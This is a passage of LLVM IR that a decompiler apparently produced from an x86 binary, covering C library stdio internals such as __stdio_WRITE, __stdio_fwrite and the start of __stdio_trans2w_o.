  uselistorder i32 %v0_804e1e6, { 1, 0 }
  uselistorder i32 %v2_804e1f815, { 1, 0 }
  uselistorder i1 %v12_804e1b3, { 1, 0 }
  uselistorder i32 %v4_804e19f, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 0, 11, 1, 6, 3, 4, 5, 12, 7, 2, 8, 9, 10 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 5, 3, 4, 6 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e215, { 1, 0 }
  uselistorder label %dec_label_pc_804e211, { 1, 0 }
  uselistorder label %dec_label_pc_804e1ef, { 1, 0 }
  uselistorder label %dec_label_pc_804e1e1, { 1, 0 }
  uselistorder label %dec_label_pc_804e1df, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_804e221 = load i32, i32* @edi, align 4
  %v0_804e223 = load i32, i32* @ebx, align 4
  %v15_804e224 = ptrtoint i32* %stack_var_-28 to i32
  %v4_804e227 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e227, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804e2334 = icmp eq i32 %arg3, 0
  store i1 %v1_804e2334, i1* %zf.global-to-local, align 1
  br i1 %v1_804e2334, label %dec_label_pc_804e294, label %dec_label_pc_804e238.lr.ph

dec_label_pc_804e238.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804e238

dec_label_pc_804e238:                             ; preds = %dec_label_pc_804e254.dec_label_pc_804e238_crit_edge, %dec_label_pc_804e238.lr.ph
  %v0_804e245 = phi i32 [ %v4_804e227, %dec_label_pc_804e238.lr.ph ], [ %v0_804e245.pre, %dec_label_pc_804e254.dec_label_pc_804e238_crit_edge ]
  %v0_804e244 = phi i32 [ %arg2, %dec_label_pc_804e238.lr.ph ], [ %v2_804e256, %dec_label_pc_804e254.dec_label_pc_804e238_crit_edge ]
  %v0_804e240.in = phi i32 [ %arg3, %dec_label_pc_804e238.lr.ph ], [ %v2_804e254, %dec_label_pc_804e254.dec_label_pc_804e238_crit_edge ]
  %v4_804e240 = phi i32 [ %arg3, %dec_label_pc_804e238.lr.ph ], [ %v2_804e254, %dec_label_pc_804e254.dec_label_pc_804e238_crit_edge ]
  %v0_804e240 = icmp slt i32 %v0_804e240.in, 0
  store i32 %v4_804e240, i32* %esi.global-to-local, align 4
  %v2_804e240 = icmp eq i1 %v0_804e240, false
  %v5_804e240 = select i1 %v2_804e240, i32 %v4_804e240, i32 2147483647
  store i32 %v5_804e240, i32* %eax.global-to-local, align 4
  %v1_804e245 = add i32 %v0_804e245, 4
  %v2_804e245 = inttoptr i32 %v1_804e245 to i32*
  %v3_804e245 = load i32, i32* %v2_804e245, align 4
  %tmp36 = inttoptr i32 %v0_804e244 to i32*
  %v5_804e248 = call i32 @__libc_write(i32 %v3_804e245, i32* %tmp36, i32 %v5_804e240)
  store i32 %v5_804e248, i32* %eax.global-to-local, align 4
  %v1_804e250 = icmp eq i32 %v5_804e248, 0
  store i1 %v1_804e250, i1* %zf.global-to-local, align 1
  %v2_804e250 = icmp slt i32 %v5_804e248, 0
  br i1 %v2_804e250, label %dec_label_pc_804e25a, label %dec_label_pc_804e254

dec_label_pc_804e254:                             ; preds = %dec_label_pc_804e238
  %v0_804e254 = load i32, i32* @ebx, align 4
  %v2_804e254 = sub i32 %v0_804e254, %v5_804e248
  %v12_804e254 = icmp eq i32 %v2_804e254, 0
  store i32 %v2_804e254, i32* @ebx, align 4
  %v0_804e256 = load i32, i32* @edi, align 4
  %v2_804e256 = add i32 %v0_804e256, %v5_804e248
  store i32 %v2_804e256, i32* @edi, align 4
  store i1 %v12_804e254, i1* %zf.global-to-local, align 1
  br i1 %v12_804e254, label %dec_label_pc_804e294, label %dec_label_pc_804e254.dec_label_pc_804e238_crit_edge

dec_label_pc_804e254.dec_label_pc_804e238_crit_edge: ; preds = %dec_label_pc_804e254
  %v0_804e245.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e238

dec_label_pc_804e25a:                             ; preds = %dec_label_pc_804e238
  %v0_804e25a = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e25a = inttoptr i32 %v0_804e25a to i32*
  %v2_804e25a = load i32, i32* %v1_804e25a, align 4
  store i32 %v2_804e25a, i32* %eax.global-to-local, align 4
  %v1_804e25d = add i32 %v0_804e25a, 8
  %v2_804e25d = inttoptr i32 %v1_804e25d to i32*
  %v3_804e25d = load i32, i32* %v2_804e25d, align 4
  store i32 %v3_804e25d, i32* @edx, align 4
  %v1_804e260 = or i32 %v2_804e25a, 8
  store i32 %v1_804e260, i32* %eax.global-to-local, align 4
  %v1_804e263 = trunc i32 %v1_804e260 to i16
  %v3_804e263 = inttoptr i32 %v0_804e25a to i16*
  store i16 %v1_804e263, i16* %v3_804e263, align 2
  %v0_804e267 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e267 = add i32 %v0_804e267, 12
  %v2_804e267 = inttoptr i32 %v1_804e267 to i32*
  %v3_804e267 = load i32, i32* %v2_804e267, align 4
  %v1_804e26a = load i32, i32* @edx, align 4
  %v2_804e26a = sub i32 %v3_804e267, %v1_804e26a
  %v12_804e26a = icmp eq i32 %v2_804e26a, 0
  store i1 %v12_804e26a, i1* %zf.global-to-local, align 1
  store i32 %v2_804e26a, i32* %eax.global-to-local, align 4
  %v4_804e290.pre = load i32, i32* @ebx, align 4
  br i1 %v12_804e26a, label %dec_label_pc_804e290, label %dec_label_pc_804e26e

dec_label_pc_804e26e:                             ; preds = %dec_label_pc_804e25a
  %v12_804e26e = icmp eq i32 %v2_804e26a, %v4_804e290.pre
  store i1 %v12_804e26e, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_804e26a, %v4_804e290.pre
  %v3_804e270 = load i32, i32* %esi.global-to-local, align 4
  %v5_804e270 = select i1 %tmp, i32 %v2_804e26a, i32 %v3_804e270
  store i32 %v5_804e270, i32* %esi.global-to-local, align 4
  %v0_804e273.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804e273

dec_label_pc_804e273:                             ; preds = %dec_label_pc_804e285, %dec_label_pc_804e26e
  %v2_804e277 = phi i32 [ %v1_804e281, %dec_label_pc_804e285 ], [ %v1_804e26a, %dec_label_pc_804e26e ]
  %v4_804e273 = phi i32 [ %v4_804e273.pre, %dec_label_pc_804e285 ], [ %v2_804e26a, %dec_label_pc_804e26e ]
  %v0_804e273 = phi i32 [ %v1_804e285, %dec_label_pc_804e285 ], [ %v0_804e273.pre, %dec_label_pc_804e26e ]
  %v1_804e273 = inttoptr i32 %v0_804e273 to i8*
  %v2_804e273 = load i8, i8* %v1_804e273, align 1
  %v3_804e273 = zext i8 %v2_804e273 to i32
  %v5_804e273 = and i32 %v4_804e273, -256
  %v6_804e273 = or i32 %v3_804e273, %v5_804e273
  store i32 %v6_804e273, i32* %eax.global-to-local, align 4
  %v10_804e275 = icmp eq i8 %v2_804e273, 10
  store i1 %v10_804e275, i1* %zf.global-to-local, align 1
  %v3_804e277 = inttoptr i32 %v2_804e277 to i8*
  store i8 %v2_804e273, i8* %v3_804e277, align 1
  %v0_804e279 = load i1, i1* %zf.global-to-local, align 1
  %v1_804e279 = icmp eq i1 %v0_804e279, false
  br i1 %v1_804e279, label %dec_label_pc_804e281, label %dec_label_pc_804e27b

dec_label_pc_804e27b:                             ; preds = %dec_label_pc_804e273
  %v0_804e27b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e27b = add i32 %v0_804e27b, 1
  %v2_804e27b = inttoptr i32 %v1_804e27b to i8*
  %v3_804e27b = load i8, i8* %v2_804e27b, align 1
  %v4_804e27b = urem i8 %v3_804e27b, 2
  %v5_804e27b = icmp eq i8 %v4_804e27b, 0
  store i1 %v5_804e27b, i1* %zf.global-to-local, align 1
  %v1_804e27f = icmp eq i1 %v5_804e27b, false
  br i1 %v1_804e27f, label %dec_label_pc_804e27b.dec_label_pc_804e288_crit_edge, label %dec_label_pc_804e281

dec_label_pc_804e27b.dec_label_pc_804e288_crit_edge: ; preds = %dec_label_pc_804e27b
  %v0_804e288.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804e288

dec_label_pc_804e281:                             ; preds = %dec_label_pc_804e27b, %dec_label_pc_804e273
  %v0_804e281 = load i32, i32* @edx, align 4
  %v1_804e281 = add i32 %v0_804e281, 1
  store i32 %v1_804e281, i32* @edx, align 4
  %v0_804e282 = load i32, i32* %esi.global-to-local, align 4
  %v1_804e282 = add i32 %v0_804e282, -1
  %v8_804e282 = icmp eq i32 %v1_804e282, 0
  store i1 %v8_804e282, i1* %zf.global-to-local, align 1
  store i32 %v1_804e282, i32* %esi.global-to-local, align 4
  br i1 %v8_804e282, label %dec_label_pc_804e281.dec_label_pc_804e288_crit_edge, label %dec_label_pc_804e285

dec_label_pc_804e281.dec_label_pc_804e288_crit_edge: ; preds = %dec_label_pc_804e281
  %v1_804e288.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e288

dec_label_pc_804e285:                             ; preds = %dec_label_pc_804e281
  %v0_804e285 = load i32, i32* @edi, align 4
  %v1_804e285 = add i32 %v0_804e285, 1
  %v8_804e285 = icmp eq i32 %v1_804e285, 0
  store i1 %v8_804e285, i1* %zf.global-to-local, align 1
  store i32 %v1_804e285, i32* @edi, align 4
  %v4_804e273.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e273

dec_label_pc_804e288:                             ; preds = %dec_label_pc_804e281.dec_label_pc_804e288_crit_edge, %dec_label_pc_804e27b.dec_label_pc_804e288_crit_edge
  %v1_804e288 = phi i32 [ %v0_804e27b, %dec_label_pc_804e27b.dec_label_pc_804e288_crit_edge ], [ %v1_804e288.pre, %dec_label_pc_804e281.dec_label_pc_804e288_crit_edge ]
  %v0_804e288 = phi i32 [ %v0_804e288.pre, %dec_label_pc_804e27b.dec_label_pc_804e288_crit_edge ], [ %v1_804e281, %dec_label_pc_804e281.dec_label_pc_804e288_crit_edge ]
  %v2_804e288 = add i32 %v1_804e288, 16
  %v3_804e288 = inttoptr i32 %v2_804e288 to i32*
  store i32 %v0_804e288, i32* %v3_804e288, align 4
  %v0_804e28b = load i32, i32* @edx, align 4
  %v1_804e28b = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e28b = add i32 %v1_804e28b, 8
  %v3_804e28b = inttoptr i32 %v2_804e28b to i32*
  %v4_804e28b = load i32, i32* %v3_804e28b, align 4
  %v5_804e28b = sub i32 %v0_804e28b, %v4_804e28b
  store i32 %v5_804e28b, i32* @edx, align 4
  %v0_804e28e = load i32, i32* @ebx, align 4
  %v2_804e28e = sub i32 %v0_804e28e, %v5_804e28b
  %v12_804e28e = icmp eq i32 %v2_804e28e, 0
  store i1 %v12_804e28e, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804e290

dec_label_pc_804e290:                             ; preds = %dec_label_pc_804e25a, %dec_label_pc_804e288
  %v4_804e290 = phi i32 [ %v2_804e28e, %dec_label_pc_804e288 ], [ %v4_804e290.pre, %dec_label_pc_804e25a ]
  %v5_804e290 = sub i32 %arg3, %v4_804e290
  %v15_804e290 = icmp eq i32 %v5_804e290, 0
  store i1 %v15_804e290, i1* %zf.global-to-local, align 1
  %v0_804e298.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804e294

dec_label_pc_804e294:                             ; preds = %dec_label_pc_804e254, %entry, %dec_label_pc_804e290
  %v0_804e298 = phi i32 [ %v0_804e298.pre, %dec_label_pc_804e290 ], [ %v15_804e224, %entry ], [ %v15_804e224, %dec_label_pc_804e254 ]
  %stack_var_12.0 = phi i32 [ %v5_804e290, %dec_label_pc_804e290 ], [ 0, %entry ], [ %arg3, %dec_label_pc_804e254 ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_804e298 = icmp eq i32 %v0_804e298, -12
  store i1 %v9_804e298, i1* %zf.global-to-local, align 1
  store i32 %v0_804e223, i32* @ebx, align 4
  store i32 %v0_804e221, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_804e285, { 1, 2, 0 }
  uselistorder i32 %v1_804e282, { 1, 0 }
  uselistorder i32 %v1_804e281, { 0, 2, 1 }
  uselistorder i8 %v2_804e273, { 1, 0, 2 }
  uselistorder i32 %v4_804e290.pre, { 2, 0, 1 }
  uselistorder i32 %v2_804e26a, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_804e256, { 1, 0 }
  uselistorder i32 %v2_804e254, { 2, 3, 0, 1 }
  uselistorder i32 %v5_804e248, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 (i32, i32*, i32)* @__libc_write, { 1, 0 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_804e294, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e290, { 1, 0 }
}

define i32 @__stdio_fwrite(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804e2a0 = load i32, i32* @ebp, align 4
  %v0_804e2a1 = load i32, i32* @edi, align 4
  %v0_804e2a2 = load i32, i32* @esi, align 4
  %v0_804e2a3 = load i32, i32* @ebx, align 4
  store i32 %v0_804e2a3, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_804e2b3 = add i32 %arg3, 1
  %v2_804e2b3 = inttoptr i32 %v1_804e2b3 to i8*
  %v3_804e2b3 = load i8, i8* %v2_804e2b3, align 1
  %v4_804e2b3 = and i8 %v3_804e2b3, 2
  %v5_804e2b3 = icmp eq i8 %v4_804e2b3, 0
  %v1_804e2b7 = icmp eq i1 %v5_804e2b3, false
  br i1 %v1_804e2b7, label %dec_label_pc_804e368, label %dec_label_pc_804e2bd

dec_label_pc_804e2bd:                             ; preds = %entry
  %v1_804e2bd = add i32 %arg3, 4
  %v2_804e2bd = inttoptr i32 %v1_804e2bd to i32*
  %v3_804e2bd = load i32, i32* %v2_804e2bd, align 4
  %v13_804e2bd = icmp eq i32 %v3_804e2bd, -2
  %v1_804e2c1 = add i32 %arg3, 16
  %v2_804e2c1 = inttoptr i32 %v1_804e2c1 to i32*
  %v3_804e2c1 = load i32, i32* %v2_804e2c1, align 4
  store i32 %v3_804e2c1, i32* @edx, align 4
  %v1_804e2c4 = add i32 %arg3, 12
  %v2_804e2c4 = inttoptr i32 %v1_804e2c4 to i32*
  %v3_804e2c4 = load i32, i32* %v2_804e2c4, align 4
  store i32 %v3_804e2c4, i32* %eax.global-to-local, align 4
  %v1_804e2c7 = icmp eq i1 %v13_804e2bd, false
  %v2_804e2e6 = sub i32 %v3_804e2c4, %v3_804e2c1
  br i1 %v1_804e2c7, label %dec_label_pc_804e2e6, label %dec_label_pc_804e2c9

dec_label_pc_804e2c9:                             ; preds = %dec_label_pc_804e2bd
  %tmp = icmp uge i32 %v2_804e2e6, %arg2
  %v5_804e2d0 = select i1 %tmp, i32 %arg2, i32 %v2_804e2e6
  store i32 %v5_804e2d0, i32* %ebx.global-to-local, align 4
  %v3_804e2d6 = inttoptr i32 %v3_804e2c1 to i16*
  %v4_804e2d6 = call i32 @memcpy(i16* %v3_804e2d6, i32 %v5_804e2d0, i32 %v3_804e2c4)
  store i32 %v4_804e2d6, i32* %eax.global-to-local, align 4
  %v0_804e2de = load i32, i32* @esi, align 4
  %v1_804e2de = add i32 %v0_804e2de, 16
  %v2_804e2de = inttoptr i32 %v1_804e2de to i32*
  %v3_804e2de = load i32, i32* %v2_804e2de, align 4
  %v4_804e2de = load i32, i32* %ebx.global-to-local, align 4
  %v5_804e2de = add i32 %v4_804e2de, %v3_804e2de
  store i32 %v5_804e2de, i32* %v2_804e2de, align 4
  br label %dec_label_pc_804e380

dec_label_pc_804e2e6:                             ; preds = %dec_label_pc_804e2bd
  store i32 %v2_804e2e6, i32* %eax.global-to-local, align 4
  %v6_804e2ea = icmp ult i32 %v2_804e2e6, %arg2
  br i1 %v6_804e2ea, label %dec_label_pc_804e34f, label %dec_label_pc_804e2ec

dec_label_pc_804e2ec:                             ; preds = %dec_label_pc_804e2e6
  %v0_804e2ec = load i32, i32* @ecx, align 4
  %v3_804e2f0 = inttoptr i32 %v3_804e2c1 to i16*
  %v4_804e2f0 = call i32 @memcpy(i16* %v3_804e2f0, i32 %arg2, i32 %v0_804e2ec)
  store i32 %v4_804e2f0, i32* %eax.global-to-local, align 4
  %v0_804e2f8 = load i32, i32* @esi, align 4
  %v1_804e2f8 = add i32 %v0_804e2f8, 16
  %v2_804e2f8 = inttoptr i32 %v1_804e2f8 to i32*
  %v3_804e2f8 = load i32, i32* %v2_804e2f8, align 4
  %v4_804e2f8 = load i32, i32* @edi, align 4
  %v5_804e2f8 = add i32 %v4_804e2f8, %v3_804e2f8
  store i32 %v5_804e2f8, i32* %v2_804e2f8, align 4
  %v0_804e2fb = load i32, i32* @esi, align 4
  %v1_804e2fb = add i32 %v0_804e2fb, 1
  %v2_804e2fb = inttoptr i32 %v1_804e2fb to i8*
  %v3_804e2fb = load i8, i8* %v2_804e2fb, align 1
  %v4_804e2fb = urem i8 %v3_804e2fb, 2
  %v5_804e2fb = icmp eq i8 %v4_804e2fb, 0
  br i1 %v5_804e2fb, label %dec_label_pc_804e380, label %dec_label_pc_804e301

dec_label_pc_804e301:                             ; preds = %dec_label_pc_804e2ec
  %v0_804e301 = load i32, i32* @edx, align 4
  %v0_804e302 = load i32, i32* @edi, align 4
  %v4_804e306 = call i32 @memrchr(i8 10, i32 %v0_804e302, i32 %v0_804e301)
  store i32 %v4_804e306, i32* %eax.global-to-local, align 4
  %v1_804e30e = icmp eq i32 %v4_804e306, 0
  br i1 %v1_804e30e, label %dec_label_pc_804e380, label %dec_label_pc_804e312

dec_label_pc_804e312:                             ; preds = %dec_label_pc_804e301
  %v0_804e315 = load i32, i32* @esi, align 4
  %v1_804e316 = call i32 @__stdio_wcommit(i32 %v0_804e315)
  store i32 %v1_804e316, i32* %eax.global-to-local, align 4
  %v1_804e31e = icmp eq i32 %v1_804e316, 0
  br i1 %v1_804e31e, label %dec_label_pc_804e380, label %dec_label_pc_804e322

dec_label_pc_804e322:                             ; preds = %dec_label_pc_804e312
  %v0_804e322 = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_804e322, %v1_804e316
  %v5_804e326 = select i1 %tmp20, i32 %v0_804e322, i32 %v1_804e316
  store i32 %v5_804e326, i32* %ebx.global-to-local, align 4
  %v2_804e32b = sub i32 %v0_804e322, %v5_804e326
  store i32 %v2_804e32b, i32* %eax.global-to-local, align 4
  %v0_804e32d = load i32, i32* @ebp, align 4
  %v2_804e32d = add i32 %v0_804e32d, %v2_804e32b
  store i32 %v2_804e32d, i32* %ebp.global-to-local, align 4
  %v4_804e334 = call i32 @__GI_memchr(i8* inttoptr (i32 10 to i8*), i32 %v5_804e326, i32 %v2_804e32b)
  store i32 %v4_804e334, i32* %eax.global-to-local, align 4
  %v1_804e33c = icmp eq i32 %v4_804e334, 0
  store i32 %v4_804e334, i32* @edx, align 4
  br i1 %v1_804e33c, label %dec_label_pc_804e380, label %dec_label_pc_804e342

dec_label_pc_804e342:                             ; preds = %dec_label_pc_804e322
  %v0_804e342 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e342 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e342 = sub i32 %v0_804e342, %v4_804e334
  %v2_804e346 = add i32 %v2_804e342, %v1_804e342
  store i32 %v2_804e346, i32* %eax.global-to-local, align 4
  %v0_804e348 = load i32, i32* @esi, align 4
  %v1_804e348 = add i32 %v0_804e348, 16
  %v2_804e348 = inttoptr i32 %v1_804e348 to i32*
  %v3_804e348 = load i32, i32* %v2_804e348, align 4
  %v5_804e348 = sub i32 %v3_804e348, %v2_804e346
  store i32 %v5_804e348, i32* %v2_804e348, align 4
  %v0_804e34b = load i32, i32* @edi, align 4
  %v1_804e34b = load i32, i32* %eax.global-to-local, align 4
  %v2_804e34b = sub i32 %v0_804e34b, %v1_804e34b
  store i32 %v2_804e34b, i32* @edi, align 4
  br label %dec_label_pc_804e380

dec_label_pc_804e34f:                             ; preds = %dec_label_pc_804e2e6
  %v2_804e34f = add i32 %arg3, 8
  %v3_804e34f = inttoptr i32 %v2_804e34f to i32*
  %v4_804e34f = load i32, i32* %v3_804e34f, align 4
  %v15_804e34f = icmp eq i32 %v3_804e2c1, %v4_804e34f
  br i1 %v15_804e34f, label %dec_label_pc_804e368, label %dec_label_pc_804e354

dec_label_pc_804e354:                             ; preds = %dec_label_pc_804e34f
  %v1_804e358 = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %v1_804e358, i32* %eax.global-to-local, align 4
  %v1_804e360 = icmp eq i32 %v1_804e358, 0
  br i1 %v1_804e360, label %dec_label_pc_804e354.dec_label_pc_804e368_crit_edge, label %dec_label_pc_804e364

dec_label_pc_804e354.dec_label_pc_804e368_crit_edge: ; preds = %dec_label_pc_804e354
  %v0_804e368.pre = load i32, i32* @edi, align 4
  %v0_804e370.pre = load i32, i32* @esi, align 4
  %v2_804e377.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804e368

dec_label_pc_804e364:                             ; preds = %dec_label_pc_804e354
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804e380

dec_label_pc_804e368:                             ; preds = %dec_label_pc_804e354.dec_label_pc_804e368_crit_edge, %dec_label_pc_804e34f, %entry
  %v2_804e377 = phi i32 [ %v2_804e377.pre, %dec_label_pc_804e354.dec_label_pc_804e368_crit_edge ], [ %v0_804e2a3, %dec_label_pc_804e34f ], [ %v0_804e2a3, %entry ]
  %v0_804e370 = phi i32 [ %v0_804e370.pre, %dec_label_pc_804e354.dec_label_pc_804e368_crit_edge ], [ %arg3, %dec_label_pc_804e34f ], [ %arg3, %entry ]
  %v0_804e368 = phi i32 [ %v0_804e368.pre, %dec_label_pc_804e354.dec_label_pc_804e368_crit_edge ], [ %arg2, %dec_label_pc_804e34f ], [ %arg2, %entry ]
  store i32 %v2_804e377, i32* @ebx, align 4
  store i32 %v0_804e2a1, i32* @edi, align 4
  %v4_804e37b = inttoptr i32 %v0_804e370 to i16*
  %v5_804e37b = call i32 @__stdio_WRITE(i16* %v4_804e37b, i32 %v0_804e368, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804e37b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e380

dec_label_pc_804e380:                             ; preds = %dec_label_pc_804e322, %dec_label_pc_804e312, %dec_label_pc_804e301, %dec_label_pc_804e2ec, %dec_label_pc_804e364, %dec_label_pc_804e342, %dec_label_pc_804e2c9, %dec_label_pc_804e368
  %v0_804e383 = load i32, i32* @edi, align 4
  store i32 %v0_804e383, i32* %eax.global-to-local, align 4
  %v2_804e385 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804e385, i32* @ebx, align 4
  store i32 %v0_804e2a2, i32* @esi, align 4
  store i32 %v0_804e2a1, i32* @edi, align 4
  store i32 %v0_804e2a0, i32* @ebp, align 4
  ret i32 %v0_804e383

; uselistorder directives
  uselistorder i32 %v2_804e346, { 1, 0 }
  uselistorder i32 %v0_804e322, { 2, 1, 0 }
  uselistorder i32 %v1_804e316, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804e2e6, { 2, 3, 1, 0 }
  uselistorder i32 %v3_804e2c1, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_804e2a1, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_804e380, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804e38c = load i32, i32* @ebx, align 4
  %v4_804e390 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804e390, i32* @ebx, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  %v2_804e398 = load i16, i16* %arg1, align 2
  %v3_804e398 = zext i16 %v2_804e398 to i32
  store i32 %v3_804e398, i32* %eax.global-to-local, align 4
  %v2_804e39b = and i32 %v3_804e398, %arg2
  %v3_804e39b = icmp eq i32 %v2_804e39b, 0
  %v1_804e39d = icmp eq i1 %v3_804e39b, false
  br i1 %v1_804e39d, label %dec_label_pc_804e3ab, label %dec_label_pc_804e39f

dec_label_pc_804e39f:                             ; preds = %entry
  %v1_804e39f = and i32 %v3_804e398, 2176
  %v2_804e39f = icmp eq i32 %v1_804e39f, 0
  %v1_804e3a4 = icmp eq i1 %v2_804e39f, false
  br i1 %v1_804e3a4, label %dec_label_pc_804e3b3, label %dec_label_pc_804e3a6

dec_label_pc_804e3a6:                             ; preds = %dec_label_pc_804e39f
  %v2_804e3a6 = or i32 %v3_804e398, %arg2
  store i32 %v2_804e3a6, i32* %eax.global-to-local, align 4
  %v1_804e3a8 = trunc i32 %v2_804e3a6 to i16
  store i16 %v1_804e3a8, i16* %arg1, align 2
  %v0_804e3ab.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804e3ab

dec_label_pc_804e3ab:                             ; preds = %entry, %dec_label_pc_804e3a6
  %v0_804e3f4 = phi i32 [ %v4_804e390, %entry ], [ %v0_804e3ab.pre, %dec_label_pc_804e3a6 ]
  %v1_804e3ab = inttoptr i32 %v0_804e3f4 to i16*
  %v2_804e3ab = load i16, i16* %v1_804e3ab, align 2
  %v3_804e3ab = zext i16 %v2_804e3ab to i32
  store i32 %v3_804e3ab, i32* %edx.global-to-local, align 4
  %v2_804e3ae = and i16 %v2_804e3ab, 32
  %v3_804e3ae = icmp eq i16 %v2_804e3ae, 0
  br i1 %v3_804e3ae, label %dec_label_pc_804e3cb, label %dec_label_pc_804e3b3

dec_label_pc_804e3b3:                             ; preds = %dec_label_pc_804e3ab, %dec_label_pc_804e39f
  %v1_804e3b3 = call i32 @__errno_location(i32 %v0_804e38c)
  store i32 %v1_804e3b3, i32* %eax.global-to-local, align 4
  %v1_804e3b8 = inttoptr i32 %v1_804e3b3 to i32*
  store i32 9, i32* %v1_804e3b8, align 4
  br label %dec_label_pc_804e3be

dec_label_pc_804e3be:                             ; preds = %dec_label_pc_804e3e2, %dec_label_pc_804e3b3
  %v0_804e3be = load i32, i32* @ebx, align 4
  %v1_804e3be = inttoptr i32 %v0_804e3be to i32*
  %v2_804e3be = load i32, i32* %v1_804e3be, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_804e3c3 = or i32 %v2_804e3be, 8
  store i32 %v1_804e3c3, i32* %eax.global-to-local, align 4
  %v1_804e3c6 = trunc i32 %v1_804e3c3 to i16
  %v3_804e3c6 = inttoptr i32 %v0_804e3be to i16*
  store i16 %v1_804e3c6, i16* %v3_804e3c6, align 2
  br label %dec_label_pc_804e42d

dec_label_pc_804e3cb:                             ; preds = %dec_label_pc_804e3ab
  %v2_804e3cb = urem i16 %v2_804e3ab, 4
  %v3_804e3cb = icmp eq i16 %v2_804e3cb, 0
  br i1 %v3_804e3cb, label %dec_label_pc_804e415, label %dec_label_pc_804e3d0

dec_label_pc_804e3d0:                             ; preds = %dec_label_pc_804e3cb
  %v2_804e3d0 = and i32 %v3_804e3ab, 4
  %v3_804e3d0 = icmp eq i32 %v2_804e3d0, 0
  %v1_804e3d3 = icmp eq i1 %v3_804e3d0, false
  br i1 %v1_804e3d3, label %dec_label_pc_804e401, label %dec_label_pc_804e3d5

dec_label_pc_804e3d5:                             ; preds = %dec_label_pc_804e3d0
  %v1_804e3d5 = add i32 %v0_804e3f4, 20
  %v2_804e3d5 = inttoptr i32 %v1_804e3d5 to i32*
  %v3_804e3d5 = load i32, i32* %v2_804e3d5, align 4
  store i32 %v3_804e3d5, i32* %eax.global-to-local, align 4
  %v2_804e3d8 = add i32 %v0_804e3f4, 16
  %v3_804e3d8 = inttoptr i32 %v2_804e3d8 to i32*
  %v4_804e3d8 = load i32, i32* %v3_804e3d8, align 4
  %v15_804e3d8 = icmp eq i32 %v3_804e3d5, %v4_804e3d8
  %v1_804e3db = icmp eq i1 %v15_804e3d8, false
